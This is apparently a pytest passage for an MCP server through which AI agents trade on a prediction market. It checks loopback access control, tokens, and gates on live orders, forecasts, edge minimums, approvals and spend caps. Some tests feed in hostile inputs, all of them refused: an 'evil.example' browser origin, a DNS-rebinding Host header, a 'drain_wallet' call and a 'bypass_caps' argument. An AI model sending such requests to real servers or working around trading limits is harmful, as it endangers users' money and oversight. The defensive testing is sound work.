"""AI agents over MCP, pinned.

An MCP client is a language model with a wallet in reach. Every test here
guards a specific way that goes wrong: a web page reaching the loopback
server, a switch that is off but a gate that is open, a cap two parallel calls
can both slip under, an agent's paper P&L leaking into the user's, or a relay
that writes something other than protocol to stdout.
"""
from __future__ import annotations

import asyncio
import json
import sys
import types

import pytest

import db
import mcp_server
import mcp_tools
import terminal_paper as tp
import terminal_trade as tt


def _run(coro):
    return asyncio.new_event_loop().run_until_complete(coro)


def _fake_service(monkeypatch, **cfg):
    mod = types.ModuleType("service")
    events: list = []
    base = {"mcp_enabled": True, "mcp_live_trading_enabled": False,
            "mcp_scripts_enabled": False, "mcp_max_order_usd": 25.0,
            "mcp_daily_limit_usd": 100.0, "terminal_paper_mode": False,
            "mcp_paper_bankroll_usd": 500.0, "terminal_paper_bankroll_usd": 1000.0}
    base.update(cfg)
    mod.STATE = types.SimpleNamespace(cfg=base, auth_ok=True, paused=False)

    async def _emit(name, payload=None):
        events.append((name, payload))
    mod.emit_event = _emit
    mod._sanitize_script_code = lambda c: str(c or "")
    mod._sync_terminal_offline = lambda: None
    monkeypatch.setitem(sys.modules, "service", mod)
    return mod, events


@pytest.fixture
def fresh(tmp_path, monkeypatch):
    monkeypatch.setattr(db, "db_path", lambda: tmp_path / "mcp.db")
    db.init_db()
    mcp_server._sessions.clear()
    return tmp_path


def _session():
    return {"client": "test-agent", "reads": 0, "writes": 0, "refused": 0}


def _call(name, args):
    return _run(mcp_tools.call(name, args, _session()))


def _text(res):
    return res["content"][0]["text"]


# ────────────────────────────────────────────────────────────────────────
# Protocol
# ────────────────────────────────────────────────────────────────────────


def test_initialize_negotiates_a_version_and_opens_a_session(fresh):
    resp, sid = _run(mcp_server.handle_message({
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "2025-06-18",
                   "clientInfo": {"name": "claude-code", "version": "9.9"}}}, None))
    assert resp["result"]["protocolVersion"] == "2025-06-18"
    assert resp["result"]["capabilities"]["tools"] is not None
    assert "conditionId" in resp["result"]["instructions"]
    assert sid and mcp_server._sessions[sid]["client"] == "claude-code"


def test_an_unknown_version_gets_ours_not_an_error(fresh):
    resp, _ = _run(mcp_server.handle_message({
        "jsonrpc": "2.0", "id": 1, "method": "initialize",
        "params": {"protocolVersion": "1999-01-01"}}, None))
    assert resp["result"]["protocolVersion"] == mcp_server.PROTOCOL_VERSIONS[0]


def test_a_notification_gets_no_response(fresh):
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "method": "notifications/initialized"}, None))
    assert resp is None


def test_tools_list_is_complete_and_schemas_are_closed(fresh):
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"}, None))
    tools = {t["name"]: t for t in resp["result"]["tools"]}
    assert len(tools) <= 40, "some clients only use the first 40 tools"
    for t in tools.values():
        assert t["inputSchema"]["type"] == "object"
        assert t["inputSchema"]["additionalProperties"] is False
        for r in t["inputSchema"]["required"]:
            assert r in t["inputSchema"]["properties"], (t["name"], r)
    # Read tools say so, so a client can auto-approve them; money tools say
    # they are destructive, so a client asks.
    assert tools["get_market"]["annotations"]["readOnlyHint"] is True
    assert tools["place_order"]["annotations"]["destructiveHint"] is True


def test_unknown_method_and_unknown_tool_are_errors(fresh):
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "id": 3, "method": "sampling/createMessage"}, None))
    assert resp["error"]["code"] == -32601
    resp, _ = _run(mcp_server.handle_message(
        {"jsonrpc": "2.0", "id": 4, "method": "tools/call",
         "params": {"name": "drain_wallet", "arguments": {}}}, None))
    assert resp["error"]["code"] == -32602


def test_unknown_arguments_are_refused_not_ignored(fresh, monkeypatch):
    _fake_service(monkeypatch)
    res = _call("get_status", {"bypass_caps": True})
    assert res["isError"] and "unknown argument" in _text(res)


def test_a_refused_argument_says_what_the_tool_takes(fresh, monkeypatch):
    """Live test 2026-11-07: an agent sent research_data `query` and
    get_trade_history `mode`, and the refusal named neither tool's real arguments."""
    _fake_service(monkeypatch)
    assert "research_data takes: sql, limit, include_crypto_history" in _text(
        _call("research_data", {"query": "select 1"}))
    res = _call("get_trade_history", {"mode": "live"})
    assert res["isError"] and "get_trade_history takes: kind, limit" in _text(res)
    assert "get_cross_venue takes: " in _text(_call("get_cross_venue", {}))


def test_every_tool_a_description_names_exists():
    """_CONFIG told agents to read `get_config`, which was never a tool."""
    import re
    import mcp_tools
    names = set(mcp_tools._TOOLS)
    for t in mcp_tools._TOOLS.values():
        texts = [t.description] + [str(p.get("description") or "") for p in t.props.values()]
        for cited in re.findall(r"\b(?:get|set|list|manage|preview|place|cancel|record|"
                                r"search|discover|backtest|validate|save)_[a-z0-9_]+\b",
                                " ".join(texts)):
            assert cited in names or cited in t.props, f"{t.name} cites {cited}"


# ────────────────────────────────────────────────────────────────────────
# HTTP: the loopback server must not be reachable from a web page.
# ────────────────────────────────────────────────────────────────────────


def _req(body=None, **headers):
    h = {"host": "127.0.0.1:47635"}
    h.update({k.replace("_", "-"): v for k, v in headers.items()})
    return {"method": "POST", "path": "/mcp", "headers": h,
            "body": json.dumps(body or {"jsonrpc": "2.0", "id": 1, "method": "ping"}).encode()}


@pytest.fixture
def served(fresh, monkeypatch):
    tok = mcp_server.ensure_token()
    monkeypatch.setattr(mcp_server, "_want", True)
    return tok


def test_a_browser_origin_is_refused_even_with_the_token(served):
    status, _, _ = _run(mcp_server._route(
        _req(authorization=f"Bearer {served}", origin="https://evil.example")))
    assert status == 403


def test_a_rebound_hostname_is_refused(served):
    """DNS rebinding: evil.example resolves to 127.0.0.1, so the TCP connection
    is local — only the Host header gives it away."""
    status, _, _ = _run(mcp_server._route(
        _req(authorization=f"Bearer {served}", host="evil.example:47635")))
    assert status == 403


def test_no_token_or_a_wrong_token_is_401(served):
    assert _run(mcp_server._route(_req()))[0] == 401
    assert _run(mcp_server._route(_req(authorization="Bearer kp_wrong")))[0] == 401


def test_the_right_token_from_loopback_is_served(served):
    status, headers, body = _run(mcp_server._route(_req(authorization=f"Bearer {served}")))
    assert status == 200 and json.loads(body)["result"] == {}
    status, _, _ = _run(mcp_server._route(
        _req(authorization=f"Bearer {served}", host="localhost:47635")))
    assert status == 200


def test_rotating_the_token_locks_out_the_old_one(served):
    new = mcp_server.rotate_token()
    assert new != served
    assert _run(mcp_server._route(_req(authorization=f"Bearer {served}")))[0] == 401
    assert _run(mcp_server._route(_req(authorization=f"Bearer {new}")))[0] == 200


def test_turned_off_means_503_even_for_a_valid_token(served, monkeypatch):
    monkeypatch.setattr(mcp_server, "_want", False)
    assert _run(mcp_server._route(_req(authorization=f"Bearer {served}")))[0] == 503


def test_the_token_is_not_stored_in_plain_sight(served):
    raw = mcp_server._token_path().read_bytes()
    # DPAPI / Fernet on a dev box; the 600-file fallback is the one case it
    # would match, and that backend logs loudly about itself.
    import polymarket_auth as auth
    if not auth._is_plaintext_secret_file(mcp_server._token_path()):
        assert served.encode() not in raw


def test_a_real_socket_round_trip(served):
    """One end-to-end pass over a real loopback socket: request parsing,
    keep-alive framing and the session header all have to agree."""
    import socket

    async def go():
        with socket.socket() as s:
            s.bind(("127.0.0.1", 0))
            port = s.getsockname()[1]
        await mcp_server.start(port)
        try:
            reader, writer = await asyncio.open_connection("127.0.0.1", port)
            body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                               "params": {"protocolVersion": "2025-06-18",
                                          "clientInfo": {"name": "sock"}}}).encode()
            writer.write(
                (f"POST /mcp HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
                 f"Authorization: Bearer {served}\r\nContent-Type: application/json\r\n"
                 f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body)
            await writer.drain()
            raw = await reader.read()
            writer.close()
            return raw, port
        finally:
            await mcp_server.stop()

    raw, port = _run(go())
    head, _, body = raw.partition(b"\r\n\r\n")
    assert head.startswith(b"HTTP/1.1 200")
    assert b"Mcp-Session-Id:" in head
    assert json.loads(body)["result"]["serverInfo"]["name"] == "krypt-polybot-us"
    assert not mcp_server.bridge_path().exists(), "stop() must remove the bridge file"


# ────────────────────────────────────────────────────────────────────────
# The 2026-07-28 revision: no handshake, the version on every request.
# The legacy handshake above must keep working beside it.
# ────────────────────────────────────────────────────────────────────────

MODERN = "2026-07-28"


def _modern(method, params=None, *, version=MODERN, caps=True, rid=1):
    meta = {mcp_server.META_VERSION: version,
            mcp_server.META_CLIENT: {"name": "modern-cli", "version": "1.0"}}
    if caps:
        meta[mcp_server.META_CAPABILITIES] = {}
    return {"jsonrpc": "2.0", "id": rid, "method": method,
            "params": {**(params or {}), "_meta": meta}}


def _modern_post(msg, token, **headers):
    """A modern POST carrying the headers the revision requires, written out
    by hand (not by the code under test). A header set to None is left out."""
    params = msg["params"]
    h = {"host": "127.0.0.1:47635", "authorization": f"Bearer {token}",
         "mcp-protocol-version": params["_meta"].get(mcp_server.META_VERSION),
         "mcp-method": msg["method"], "mcp-name": params.get("name")}
    h.update({k.replace("_", "-"): v for k, v in headers.items()})
    return {"method": "POST", "path": "/mcp",
            "headers": {k: v for k, v in h.items() if v is not None},
            "body": json.dumps(msg).encode()}


def _post_modern(msg, token, **headers):
    status, out_headers, body = _run(mcp_server._route(_modern_post(msg, token, **headers)))
    return status, out_headers, json.loads(body)


def test_server_discover_names_both_eras_and_opens_no_session(served):
    status, headers, out = _post_modern(_modern("server/discover"), served)
    assert status == 200 and "Mcp-Session-Id" not in headers
    r = out["result"]
    assert r["resultType"] == "complete"
    assert r["supportedVersions"][0] == MODERN and "2025-11-25" in r["supportedVersions"]
    assert r["capabilities"] == mcp_server.CAPABILITIES
    assert r["instructions"] == mcp_server.INSTRUCTIONS
    assert r["ttlMs"] >= 0 and r["cacheScope"] == "private"
    assert r["_meta"][mcp_server.META_SERVER]["name"] == "krypt-polybot-us"
    assert mcp_server._sessions == {}
    # The legacy handshake beside it is unchanged.
    resp, sid = _run(mcp_server.handle_message({
        "jsonrpc": "2.0", "id": 2, "method": "initialize",
        "params": {"protocolVersion": "2025-11-25", "clientInfo": {"name": "old"}}}, None))
    assert resp["result"]["protocolVersion"] == "2025-11-25" and sid
    assert "resultType" not in resp["result"]


def test_a_modern_request_is_served_with_no_handshake_and_no_session(served, monkeypatch):
    _fake_service(monkeypatch)
    msg = _modern("tools/call", {"name": "get_status", "arguments": {}})
    status, headers, out = _post_modern(msg, served, mcp_session_id="stale-from-a-legacy-era")
    assert status == 200 and "Mcp-Session-Id" not in headers
    r = out["result"]
    assert r["resultType"] == "complete" and r["isError"] is False, r
    assert json.loads(r["content"][0]["text"])["trading"]["yourMode"] == "paper"
    assert mcp_server._sessions == {}
    assert any(c["client"] == "modern-cli" for c in mcp_server.seen()["clients"])
    _status, _h, out = _post_modern(_modern("tools/list"), served)
    assert out["result"]["resultType"] == "complete" and out["result"]["cacheScope"] == "private"
    assert len(out["result"]["tools"]) == len(mcp_tools.list_tools())


def test_an_unsupported_version_is_a_400_naming_the_ones_we_speak(served):
    status, _h, out = _post_modern(_modern("tools/list", version="2099-01-01"), served)
    assert status == 400
    assert out["error"]["code"] == -32022
    assert out["error"]["data"] == {"supported": list(mcp_server.SUPPORTED_VERSIONS),
                                    "requested": "2099-01-01"}


def test_a_modern_request_without_client_capabilities_is_a_400(served):
    status, _h, out = _post_modern(_modern("tools/list", caps=False), served)
    assert status == 400 and out["error"]["code"] == -32602


def test_modern_headers_must_match_the_body_or_nothing_runs(served, monkeypatch):
    import base64
    _fake_service(monkeypatch)
    ran = []

    async def _spy(name, args, session):
        ran.append(name)
        return {"content": [{"type": "text", "text": "{}"}], "isError": False}
    monkeypatch.setattr(mcp_tools, "call", _spy)
    msg = _modern("tools/call", {"name": "pause_all_engines", "arguments": {}})
    for bad in ({"mcp_protocol_version": None}, {"mcp_protocol_version": "2025-11-25"},
                {"mcp_method": None}, {"mcp_method": "tools/list"},
                {"mcp_name": None}, {"mcp_name": "get_status"}):
        status, _h, out = _post_modern(msg, served, **bad)
        assert status == 400 and out["error"]["code"] == -32020, bad
    # A modern version in the header and none in the body is a mismatch too.
    legacy_body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list"}
    status, _h, body = _run(mcp_server._route(_req(
        legacy_body, authorization=f"Bearer {served}", mcp_protocol_version=MODERN)))
    assert status == 400 and json.loads(body)["error"]["code"] == -32020
    assert ran == []
    # A name sent in the revision's base64 form is decoded before comparing.
    b64 = "=?base64?" + base64.b64encode(b"pause_all_engines").decode() + "?="
    status, _h, out = _post_modern(msg, served, mcp_name=b64)
    assert status == 200 and ran == ["pause_all_engines"], out


def test_an_unknown_modern_method_is_a_404_and_a_legacy_one_stays_200(served):
    status, _h, out = _post_modern(_modern("subscriptions/listen"), served)
    assert status == 404 and out["error"]["code"] == -32601
    status, _h, body = _run(mcp_server._route(_req(
        {"jsonrpc": "2.0", "id": 1, "method": "subscriptions/listen"},
        authorization=f"Bearer {served}")))
    assert status == 200 and json.loads(body)["error"]["code"] == -32601


def test_header_values_round_trip_through_the_base64_form():
    for v in ("get_status", " padded ", "Hello, 世界", "line1\nline2", "=?base64?x?="):
        enc = mcp_server.encode_header_value(v)
        assert all(" " <= c <= "~" for c in enc)
        assert mcp_server.decode_header_value(enc) == v
    assert mcp_server.encode_header_value("get_status") == "get_status"
    assert mcp_server.decode_header_value("=?base64?not base64!?=") is None


# ────────────────────────────────────────────────────────────────────────
# Gates
# ────────────────────────────────────────────────────────────────────────


def _no_venue(monkeypatch):
    sent = []

    async def _place(order, *, origin="manual", standing_id=None):
        sent.append((order, origin))
        return {"ok": True, "orderId": f"0xorder{len(sent)}", "status": "live",
                "message": "sent"}

    async def _no_reconcile(limit=0):
        return {"inserted": 0, "matched": 0}
    monkeypatch.setattr(tt, "place", _place)
    monkeypatch.setattr(tt, "reconcile_fills", _no_reconcile)
    return sent


def _priced(monkeypatch, cost=5.0):
    async def _preview(req):
        return {"blockers": [], "warnings": [], "costUsd": cost,
                "side": req["side"], "action": req["action"],
                "size": req["size"], "priceCents": req["priceCents"],
                "availableUsd": None}
    monkeypatch.setattr(tt, "preview", _preview)


_BUY = {"conditionId": "0xabc", "side": "yes", "action": "buy",
        "size": 10, "priceCents": 50}


def _live(monkeypatch, **cfg):
    """An app whose agents may trade live, approvals off unless asked for."""
    base = {"mcp_trade_mode": "live", "mcp_live_approval": False,
            "mcp_agents": [{"id": "default", "mode": "live"}]}
    base.update(cfg)
    svc = _fake_service(monkeypatch, **base)
    _mock_book(monkeypatch)
    return svc


def _forecast(fv=70.0, cid="0xabc", agent="default"):
    import forecast_ledger
    return forecast_ledger.record(condition_id=cid, prob_yes=fv / 100.0,
                                  agent_id=agent, rationale="test forecast rationale")


def _agent_buy(conn, *, oid, size, filled_shares, cid="0xabc", side="yes",
               agent="default", price=50.0):
    """An agent's live buy that went out, and what the venue's ledger says it
    filled."""
    conn.execute(
        "INSERT INTO mcp_orders (created_at, network, mode, agent_id, condition_id, "
        "side, action, size, price_cents, committed_usd, ok, order_id) "
        "VALUES (datetime('now'),'mainnet','live',?,?,?,'buy',?,?,?,1,?)",
        (agent, cid, side, size, price, size * price / 100.0, oid))
    if filled_shares:
        conn.execute(
            "INSERT INTO terminal_fills (trade_id, order_id, condition_id, side, "
            "action, size, price_cents, origin, network, filled_at) "
            "VALUES (?,?,?,?,'buy',?,?,'ai','mainnet',datetime('now'))",
            (f"t-{oid}", oid, cid, side, filled_shares, price))


def test_trading_off_means_nobody_trades(fresh, monkeypatch):
    _live(monkeypatch, mcp_trade_mode="off")
    sent = _no_venue(monkeypatch)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"] and "OFF" in _text(res)
    assert sent == []


def test_an_agent_cannot_choose_live_when_the_user_set_paper(fresh, monkeypatch):
    _fake_service(monkeypatch, mcp_trade_mode="paper")
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", {**_BUY, "mode": "live", "forecastId": _forecast()})
    assert res["isError"] and "PAPER mode" in _text(res)
    assert sent == []
    assert mcp_server.audit_log(1)[0]["outcome"] == "refused"


def test_global_paper_mode_narrows_live_to_paper(fresh, monkeypatch):
    _live(monkeypatch, terminal_paper_mode=True)
    sent = _no_venue(monkeypatch)
    res = _call("place_order", {**_BUY, "mode": "live", "forecastId": _forecast()})
    assert res["isError"] and "PAPER mode" in _text(res)
    assert sent == []


def test_a_buy_without_a_forecast_is_refused(fresh, monkeypatch):
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", dict(_BUY))
    assert res["isError"] and "record_forecast" in _text(res)
    assert sent == []


def test_a_buy_must_clear_the_minimum_edge_after_fee(fresh, monkeypatch):
    _live(monkeypatch, mcp_min_edge_cents=3.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", {**_BUY, "forecastId": _forecast(51.0)})
    assert res["isError"] and "+1.00¢" in _text(res) and "minimum is 3" in _text(res)
    assert sent == []


def test_an_unknown_fee_means_the_edge_cannot_be_checked(fresh, monkeypatch):
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    import mcp_rails
    monkeypatch.setattr(mcp_rails, "fee_cents", lambda m, px: None)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert res["isError"] and "fee" in _text(res)
    assert sent == []


def test_another_agents_forecast_reads_as_missing(fresh, monkeypatch):
    _live(monkeypatch, mcp_agents=[{"id": "default", "mode": "live"},
                                   {"id": "sam", "name": "Sports Sam", "mode": "live"}])
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", {**_BUY, "forecastId": _forecast(agent="sam")})
    assert res["isError"] and "record_forecast" in _text(res)
    assert sent == []


def test_a_stale_forecast_is_refused(fresh, monkeypatch):
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    fid = _forecast()
    with db.get_db() as conn:
        conn.execute("UPDATE ai_forecasts SET created_at=datetime('now','-2 hours') "
                     "WHERE id=?", (fid,))
    res = _call("place_order", {**_BUY, "forecastId": fid})
    assert res["isError"] and "older than" in _text(res)
    assert sent == []


def _forecast_then_now(monkeypatch, then, now):
    """A forecast recorded with YES at `then`, previewed with YES at `now`."""
    import forecast_ledger
    import mcp_rails
    fid = forecast_ledger.record(condition_id="0xabc", prob_yes=0.70, agent_id="default",
                                 rationale="test forecast rationale", market={"mid": then})
    real = mcp_rails.market

    async def _moved(cid):
        return {**(await real(cid)), "mid": now}
    monkeypatch.setattr(mcp_rails, "market", _moved)
    return fid


def test_a_preview_says_how_far_the_price_moved_since_the_forecast(fresh, monkeypatch):
    """Live 2026-11-07: a forecast up to 30 minutes old was accepted on a
    15-minute market with nothing said about the price having moved under it."""
    _live(monkeypatch)
    _no_venue(monkeypatch)
    _priced(monkeypatch)
    fid = _forecast_then_now(monkeypatch, 40.0, 49.0)
    out = json.loads(_text(_call("preview_order", {**_BUY, "forecastId": fid})))
    f = out["forecast"]
    assert (f["id"], f["midThenCents"], f["midNowCents"], f["movedCents"]) == (fid, 40.0, 49.0, 9.0)
    assert 0 <= f["ageSec"] < 60
    assert out["blockers"] == [], "it warns; the edge check is what refuses"
    [w] = [w for w in out["warnings"] if "moved" in w]
    assert "+9¢" in w and "40¢ then, 49¢ now" in w and "record a new forecast" in w


def test_a_price_that_held_still_gets_no_drift_warning(fresh, monkeypatch):
    _live(monkeypatch)
    _no_venue(monkeypatch)
    _priced(monkeypatch)
    fid = _forecast_then_now(monkeypatch, 48.0, 49.0)
    out = json.loads(_text(_call("preview_order", {**_BUY, "forecastId": fid})))
    assert out["forecast"]["movedCents"] == 1.0
    assert not [w for w in out["warnings"] if "moved" in w]
    # A price nobody read is not a price that didn't move.
    out = json.loads(_text(_call("preview_order", {**_BUY, "forecastId": _forecast()})))
    assert out["forecast"]["midThenCents"] is None and out["forecast"]["movedCents"] is None
    assert json.loads(_text(_call("preview_order", {
        **_BUY, "action": "sell"})))["forecast"] is None


def test_a_post_only_buy_is_checked_with_no_fee_against_its_own_minimum(fresh, monkeypatch):
    """A post-only order can only rest, so it never pays the taker fee. Resting
    bids filled mostly when the price was moving against them, so they get their
    own minimum edge instead of the fee's accidental margin."""
    import mcp_rails
    _live(monkeypatch, mcp_min_edge_cents=3.0, mcp_min_edge_resting_cents=5.0)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    monkeypatch.setattr(mcp_rails, "fee_cents", lambda m, px: 1.75)
    # 54 against 50: +2.25 after the taker fee (under 3), +4 with no fee (under 5).
    fid = _forecast(54.0)
    assert "+2.25¢" in _text(_call("place_order", {**_BUY, "forecastId": fid}))
    res = _call("place_order", {**_BUY, "forecastId": fid, "postOnly": True})
    assert res["isError"] and "+4.00¢" in _text(res)
    assert "post-only" in _text(res) and "minimum for a post-only buy is 5¢" in _text(res)
    # 56 against 50: +4.25 taking, +6 resting. Both clear, and the flag reaches the ticket.
    fid = _forecast(56.0)
    out = json.loads(_text(_call("preview_order", {**_BUY, "forecastId": fid, "postOnly": True})))
    assert out["postOnly"] is True and out["edgeCentsAfterFee"] == 6.0 and out["blockers"] == []
    res = _call("place_order", {**_BUY, "forecastId": fid, "postOnly": True})
    assert not res["isError"], _text(res)
    assert sent[-1][0]["postOnly"] is True
    assert mcp_rails.activity(1)[0]["postOnly"] is True
    assert sent == sent[-1:], "the refused orders sent nothing"


def test_post_only_needs_an_order_that_can_rest(fresh, monkeypatch):
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    res = _call("place_order", {**_BUY, "forecastId": _forecast(), "orderType": "FAK",
                                "postOnly": True})
    assert res["isError"] and "postOnly needs a GTC order" in _text(res)
    assert sent == []


def test_an_unknown_fee_is_not_made_free_by_post_only(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch)
    monkeypatch.setattr(mcp_rails, "fee_cents", lambda m, px: None)
    res = _call("place_order", {**_BUY, "forecastId": _forecast(), "postOnly": True})
    assert res["isError"] and "fee" in _text(res)
    assert sent == []


def test_a_live_buy_inside_the_rails_is_sent_tagged_ai(fresh, monkeypatch):
    _live(monkeypatch)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert not res["isError"], _text(res)
    assert len(sent) == 1
    order, origin = sent[0]
    assert origin == "ai", "agent orders must land in their own origin"
    assert order["confirmUsd"] == 5.0
    with db.get_db() as conn:
        row = conn.execute("SELECT * FROM mcp_orders").fetchone()
    assert row["ok"] == 1 and row["order_id"] == "0xorder1" and row["agent_id"] == "default"


def test_live_orders_wait_for_approval_by_default(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch, mcp_live_approval=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    assert not res["isError"], _text(res)
    out = json.loads(_text(res))
    assert out["pending"] is True and sent == []
    rid = out["approvalId"]
    st = json.loads(_text(_call("get_orders", {"approvalId": rid})))
    assert st["status"] == "pending"
    # The queued order already counts against today's spend.
    assert mcp_rails.spent_today("live") == 5.0
    done = _run(mcp_rails.decide(rid, True))
    assert done["ok"], done
    assert len(sent) == 1
    assert not _run(mcp_rails.decide(rid, True))["ok"], "approved twice"
    assert json.loads(_text(_call("get_orders", {"approvalId": rid})))["status"] == "approved"


def test_rejected_and_expired_approvals_send_nothing(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch, mcp_live_approval=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    a = json.loads(_text(_call("place_order", {**_BUY, "forecastId": _forecast()})))
    b = json.loads(_text(_call("place_order", {**_BUY, "forecastId": _forecast()})))
    assert _run(mcp_rails.decide(a["approvalId"], False))["ok"]
    with db.get_db() as conn:
        conn.execute("UPDATE mcp_orders SET created_at=datetime('now','-20 minutes') "
                     "WHERE id=?", (b["approvalId"],))
    assert not _run(mcp_rails.decide(b["approvalId"], True))["ok"]
    assert sent == []
    # Expired spends nothing; rejected spends nothing.
    assert mcp_rails.spent_today("live") == 0.0


def test_an_approval_is_re_vetted_when_it_is_answered(fresh, monkeypatch):
    """The agent asked minutes ago. If the user has since put it back on
    paper, approving must not send a live order."""
    import mcp_rails
    svc = _live(monkeypatch, mcp_live_approval=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    rid = json.loads(_text(_call("place_order", {**_BUY, "forecastId": _forecast()})))["approvalId"]
    svc[0].STATE.cfg["mcp_trade_mode"] = "paper"
    res = _run(mcp_rails.decide(rid, True))
    assert not res["ok"] and "not live" in res["message"]
    assert sent == []


def _queued():
    """One live buy queued for approval; → its approval id."""
    res = _call("place_order", {**_BUY, "forecastId": _forecast()})
    out = json.loads(_text(res))
    assert out["pending"] is True, out
    return out["approvalId"]


def test_an_approved_order_whose_send_raises_is_unknown_and_still_spent(fresh, monkeypatch):
    """It may be on the venue: it keeps counting against the day's cap, and
    the agent and the user are told to look before trying again."""
    import mcp_rails
    _live(monkeypatch, mcp_live_approval=True)
    _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    rid = _queued()

    async def _boom(order, *, origin="manual", standing_id=None):
        raise RuntimeError("connection reset after send")
    monkeypatch.setattr(tt, "place", _boom)
    res = _run(mcp_rails.decide(rid, True))
    assert not res["ok"] and "may or may not have reached" in res["message"]
    st = json.loads(_text(_call("get_orders", {"approvalId": rid})))
    assert st["status"] == "unknown"
    assert mcp_rails.spent_today("live") == 5.0
    assert mcp_rails.spent_today("live", agent_id="default") == 5.0
    assert not _run(mcp_rails.decide(rid, True))["ok"], "approved a second time"


def test_an_approved_order_the_venue_refuses_is_refused_and_spends_nothing(fresh, monkeypatch):
    import mcp_rails
    _live(monkeypatch, mcp_live_approval=True)
    _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    refused, errored = _queued(), _queued()
    answers = iter([
        # What terminal_trade.place returns for a definite venue refusal.
        {"ok": False, "orderId": None, "status": "rejected", "filledSize": 0.0,
         "avgPriceCents": None, "localId": 1, "httpStatus": 400, "geoblocked": False,
         "message": "not enough balance / allowance"},
        # 'error' is a send that may have landed: unknown, not refused.
        {"ok": False, "status": "error", "orderId": None, "filledSize": None,
         "avgPriceCents": None, "localId": 2, "message": "Request timed out"}])

    async def _venue(order, *, origin="manual", standing_id=None):
        return next(answers)
    monkeypatch.setattr(tt, "place", _venue)
    res = _run(mcp_rails.decide(refused, True))
    assert not res["ok"] and "not enough balance" in res["message"]
    assert json.loads(_text(_call("get_orders", {"approvalId": refused})))["status"] == "refused"
    # Still counted: the second one is queued, waiting.
    assert mcp_rails.spent_today("live") == 5.0
    res = _run(mcp_rails.decide(errored, True))
    assert not res["ok"]
    assert json.loads(_text(_call("get_orders", {"approvalId": errored})))["status"] == "unknown"
    assert mcp_rails.spent_today("live") == 5.0


def test_approving_for_a_deleted_or_switched_off_agent_sends_nothing(fresh, monkeypatch):
    import mcp_rails
    sam = {"id": "sam", "name": "Sam", "mode": "live"}
    svc, _ = _live(monkeypatch, mcp_live_approval=True,
                   mcp_agents=[{"id": "default", "mode": "live"}, sam])
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    as_sam = dict(_session(), agent="sam")

    def _ask():
        res = _run(mcp_tools.call("place_order", {**_BUY, "forecastId": _forecast(agent="sam")},
                                  as_sam))
        return json.loads(_text(res))["approvalId"]
    gone, off = _ask(), _ask()
    svc.STATE.cfg["mcp_agents"] = [{"id": "default", "mode": "live"}, {**sam, "enabled": False}]
    res = _run(mcp_rails.decide(off, True))
    assert not res["ok"] and "switched off" in res["message"]
    svc.STATE.cfg["mcp_agents"] = [{"id": "default", "mode": "live"}]
    res = _run(mcp_rails.decide(gone, True))
    assert not res["ok"] and "no longer exists" in res["message"]
    assert sent == []
    with db.get_db() as conn:
        st = {r["id"]: r["status"] for r in conn.execute("SELECT id, status FROM mcp_orders")}
    assert st[gone] == "failed" and st[off] == "failed"
    assert mcp_rails.spent_today("live") == 0.0


def test_approving_after_the_account_went_to_paper_sends_nothing(fresh, monkeypatch):
    """Queued while the account was Live; the user switched it to Paper. Back
    on Live, an order still inside its window is re-vetted and may go."""
    import mcp_rails
    svc, _ = _live(monkeypatch, mcp_live_approval=True)
    sent = _no_venue(monkeypatch)
    _priced(monkeypatch, 5.0)
    first, second = _queued(), _queued()
    svc.STATE.cfg.update(account_mode="paper", terminal_paper_mode=True)
    res = _run(mcp_rails.decide(first, True))
    assert not res["ok"] and "now paper, not live" in res["message"]
    assert sent == []
    assert json.loads(_text(_call("get_orders", {"approvalId": first})))["status"] == "failed"
    svc.STATE.cfg.update(account_mode="live", terminal_paper_mode=False)
    res = _run(mcp_rails.decide(second, True))
    assert res["ok"], res
    assert len(sent) == 1 and sent[0][1] == "ai"


_CHAIN_CID = "cpc-chain-test-2030-01-01"
_CHAIN_MARKET = {
    "slug": _CHAIN_CID, "question": "Will the chain test pass?",
    "outcomes": '["Yes", "No"]', "outcomePrices": '["0.50", "0.52"]',
    "active": True, "closed": False, "status": "MARKET_STATUS_OPEN",
    "endDate": "2030-01-01T00:00:00Z", "category": "crypto",
    "orderPriceMinTickSize": 0.01, "minimumTradeQty": 5, "feeCoefficient": 0,
    "bestBidQuote": {"value": "0.48", "currency": "USD"},
    "bestAskQuote": {"value": "0.50", "currency": "USD"},
}


_CHAIN_KEY = "11111111-2222-3333-4444-555555555555"


class _FakeResponse:
    def __init__(self, status, body):
        self.status_code = status
        self.headers: dict = {}
        self._body = body
        self.text = json.dumps(body)

    def json(self):
